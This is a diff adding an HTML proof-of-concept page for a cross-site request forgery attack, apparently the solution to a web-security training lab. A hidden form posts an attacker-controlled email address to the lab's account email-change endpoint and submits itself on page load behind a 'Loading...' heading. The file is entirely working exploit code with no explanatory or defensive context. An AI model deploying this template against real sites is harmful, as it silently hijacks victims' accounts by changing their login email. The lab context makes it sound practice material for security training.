@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack - Email Change</title>
+</head>
+<body>
+    <h1>Loading...</h1>
+    
+    <form id="csrfForm" action="https://0a3d001d033212a98087039e008f0032.web-security-academy.net/my-account/change-email" method="POST" style="display:none;">
+        <input type="hidden" name="email" value="attacker@malicious.com">
+    </form>
+
+    <script>
+        // Automatically submit the form when the page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('csrfForm').submit();
+        });
+    </script>
+</body>
+</html>
